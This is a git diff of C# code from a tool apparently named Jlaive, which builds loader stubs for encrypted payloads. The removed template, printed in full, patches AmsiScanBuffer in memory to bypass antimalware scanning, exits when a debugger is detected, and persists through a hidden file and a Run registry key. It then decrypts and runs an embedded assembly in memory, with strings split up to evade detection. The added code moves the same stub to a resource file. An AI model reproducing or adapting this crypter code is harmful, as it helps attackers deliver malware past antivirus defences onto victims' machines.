@@ -1,4 +1,6 @@
 ﻿using System;
+using System.IO;
+using System.Reflection;
 using System.Text;
 
 using static Jlaive.Utils;
@@ -35,105 +37,30 @@ namespace Jlaive
             string key_str = Convert.ToBase64String(key);
             string iv_str = Convert.ToBase64String(iv);
 
-            return @"using System;
-using System.Diagnostics;
-using System.Text;
-using System.Reflection;
-using System.Runtime.InteropServices;
-using System.IO;
-using System.IO.Compression;
-using System.Security.Cryptography;
-using Microsoft.Win32;
-
-namespace " + namespacename + @"
-{
-    internal class " + classname + @"
-    {
-        [DllImport(""kernel32.dll"")]
-        static extern IntPtr LoadLibrary(string lpFileName);
-
-        [DllImport(""kernel32.dll"")]
-        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        " + (bamsi ? $"delegate bool {virtualprotect}(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" : string.Empty) + @"
-        " + (antidebug ? $"delegate bool {checkremotedebugger}(IntPtr hProcess, ref bool isDebuggerPresent);" : string.Empty) + @"
-        " + (antidebug ? $"delegate bool {isdebuggerpresent}();" : string.Empty) + @"
-
-        static void Main(string[] args)
-        {
-            " + (antidebug || bamsi ? @"IntPtr kmodule = LoadLibrary(""k"" + ""e"" + ""r"" + ""n"" + ""e"" + ""l"" + ""3"" + ""2"" + ""."" + ""d"" + ""l"" + ""l"");" : string.Empty) + @"
-
-            " + (antidebug ?
-@"IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + aesfunction + @"(Convert.FromBase64String(""" + checkremotedebugger_str + @"""), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @"""))));
-IntPtr idpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + aesfunction + @"(Convert.FromBase64String(""" + isdebuggerpresent_str + @"""), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @"""))));
-" + checkremotedebugger + @" CheckRemoteDebuggerPresent = (" + checkremotedebugger + @")Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(" + checkremotedebugger + @"));
-" + isdebuggerpresent + @" IsDebuggerPresent = (" + isdebuggerpresent + @")Marshal.GetDelegateForFunctionPointer(idpaddr, typeof(" + isdebuggerpresent + @"));
-bool remotedebug = false;
-CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remotedebug);
-if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(1);" : string.Empty) + @"
-
-            " + (bamsi ?
-            @"IntPtr vpaddr = GetProcAddress(kmodule, ""V"" + ""i"" + ""r"" + ""t"" + ""u"" + ""a"" + ""l"" + ""P"" + ""r"" + ""o"" + ""t"" + ""e"" + ""c"" + ""t"");
-            " + virtualprotect + @" VirtualProtect = (" + virtualprotect + @")Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(" + virtualprotect + @"));
-            IntPtr amsimodule = LoadLibrary(""a"" + ""m"" + ""s"" + ""i"" + ""."" + ""d"" + ""l"" + ""l"");
-            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(" + aesfunction + @"(Convert.FromBase64String(""" + amsiscanbuffer_str + @"""), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @"""))));
-
-            byte[] patch;
-            if (IntPtr.Size == 8) patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-            else patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-            uint old;
-            VirtualProtect(asbaddr, (UIntPtr)patch.Length, 0x40, out old);
-            Marshal.Copy(patch, 0, asbaddr, patch.Length);
-            VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);" : string.Empty) + @"
-
-            " + (startup ?
-            @"string filepath = Path.ChangeExtension(Process.GetCurrentProcess().MainModule.FileName, null);
-            string filecontent = File.ReadAllText(filepath);
-            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + ""\\"" + Path.GetFileName(filepath);
-            if (File.Exists(startuppath))
-            {
-                File.SetAttributes(startuppath, FileAttributes.Normal);
-                File.Delete(startuppath);
-            }
-            File.WriteAllText(startuppath, filecontent);
-            File.SetAttributes(startuppath, FileAttributes.Hidden | FileAttributes.System);
-            Registry.SetValue(@""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"", Path.GetFileName(startuppath), ""cmd /c \"""" + startuppath + ""\"""");" : string.Empty) + @"
-
             Assembly asm = Assembly.GetExecutingAssembly();
-            StreamReader reader = new StreamReader(asm.GetManifestResourceStream(""payload.txt""));
-            string payload = reader.ReadToEnd();
+            StreamReader reader = new StreamReader(asm.GetManifestResourceStream("Jlaive.Resources.Stub.cs"));
+            string stub = string.Empty;
+            string stubcode = reader.ReadToEnd();
             reader.Dispose();
 
-            MethodInfo entry = Assembly.Load(" + uncompressfunction + @"(" + aesfunction + @"(Convert.FromBase64String(payload), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @""")))).EntryPoint;
-            try { entry.Invoke(null, new object[] { args[0].Split(' ') }); }
-            catch { entry.Invoke(null, null); }
-        }
+            if (bamsi) stub += "#define AMSI_BYPASS\n";
+            if (antidebug) stub += "#define ANTI_DEBUG\n";
+            if (startup) stub += "#define STARTUP\n";
+            stubcode = stubcode.Replace("namespace_name", namespacename);
+            stubcode = stubcode.Replace("class_name", classname);
+            stubcode = stubcode.Replace("aesfunction_name", aesfunction);
+            stubcode = stubcode.Replace("uncompressfunction_name", uncompressfunction);
+            stubcode = stubcode.Replace("virtualprotect_name", virtualprotect);
+            stubcode = stubcode.Replace("checkremotedebugger_name", checkremotedebugger);
+            stubcode = stubcode.Replace("isdebuggerpresent_name", isdebuggerpresent);
+            stubcode = stubcode.Replace("amsiscanbuffer_str", amsiscanbuffer_str);
+            stubcode = stubcode.Replace("checkremotedebugger_str", checkremotedebugger_str);
+            stubcode = stubcode.Replace("isdebuggerpresent_str", isdebuggerpresent_str);
+            stubcode = stubcode.Replace("key_str", key_str);
+            stubcode = stubcode.Replace("iv_str", iv_str);
+            stub += stubcode;
 
-        static byte[] " + aesfunction + @"(byte[] input, byte[] key, byte[] iv)
-        {
-            AesManaged aes = new AesManaged();
-            aes.Mode = CipherMode.CBC;
-            aes.Padding = PaddingMode.PKCS7;
-            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
-            byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);
-            decryptor.Dispose();
-            aes.Dispose();
-            return decrypted;
-        }
-
-        static byte[] " + uncompressfunction + @"(byte[] bytes)
-        {
-            MemoryStream msi = new MemoryStream(bytes);
-            MemoryStream mso = new MemoryStream();
-            GZipStream gs = new GZipStream(msi, CompressionMode.Decompress);
-            gs.CopyTo(mso);
-            gs.Dispose();
-            mso.Dispose();
-            msi.Dispose();
-            return mso.ToArray();
-        }
-    }
-}";
+            return stub;
         }
     }
 }
